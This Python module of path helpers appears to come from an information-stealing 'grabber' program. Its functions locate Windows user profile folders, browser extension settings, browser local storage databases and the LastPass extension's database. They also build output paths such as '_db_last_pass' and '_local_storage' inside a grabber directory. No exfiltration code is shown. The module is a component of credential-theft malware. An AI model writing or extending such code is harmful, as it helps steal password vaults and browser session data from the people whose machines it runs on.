import os
from constants import (
    APPDATA, LOCAL, ROAMING, TEMP,
    USERPROFILE_ENV, TEMP_ENV, TMP_ENV,
    LOCALAPPDATA_ENV, APPDATA_ENV,
    LEXTS, SEXTS,
    LSTOR, LDB, DBS, LPEXT_ID
)
from config import (
    GRABBER_DIR, TOOLS_DIR, APP_DIR,
    LOCAL_STORAGE_DIR, DB_LAST_DIR
)

def get_temp_dir():
    temp_dir = os.getenv(TEMP_ENV) or os.getenv(TMP_ENV)
    if not temp_dir:
        user_profile = os.getenv(USERPROFILE_ENV, "")
        if user_profile:
            temp_dir = os.path.join(user_profile, APPDATA, LOCAL, TEMP)
    return temp_dir or ""

def get_user_profile():
    return os.getenv(USERPROFILE_ENV, "")

def get_local_appdata():
    return os.getenv(LOCALAPPDATA_ENV, "")

def get_appdata():
    return os.getenv(APPDATA_ENV, "")

def get_browser_user_data_path(user_profile_path, browser_rel_path):
    return os.path.join(user_profile_path, browser_rel_path)

def get_app_data_path(user_profile_path, is_local):
    if is_local:
        return os.path.join(user_profile_path, APPDATA, LOCAL)
    else:
        return os.path.join(user_profile_path, APPDATA, ROAMING)

def get_grabber_output_dir(base_dir):
    return os.path.join(base_dir, GRABBER_DIR)

def get_tools_dir(base_dir):
    return os.path.join(base_dir, TOOLS_DIR)

def get_app_dest_dir(destination_dir, user_name, app_name):
    return os.path.join(destination_dir, APP_DIR, f"{user_name}_{app_name}")

def get_local_ext_settings_path(profile_path):
    return os.path.join(profile_path, LEXTS)

def get_sync_ext_settings_path(profile_path):
    return os.path.join(profile_path, SEXTS)

def get_local_storage_path(profile_path):
    return os.path.join(profile_path, LSTOR, LDB)

def get_lastpass_db_path(profile_path):
    return os.path.join(profile_path, DBS, LPEXT_ID)

def get_local_storage_dest_path(destination_dir, prefix):
    return os.path.join(destination_dir, LOCAL_STORAGE_DIR, f"{prefix}_local_storage")

def get_lastpass_dest_path(destination_dir, prefix):
    return os.path.join(destination_dir, DB_LAST_DIR, f"{prefix}_db_last_pass")

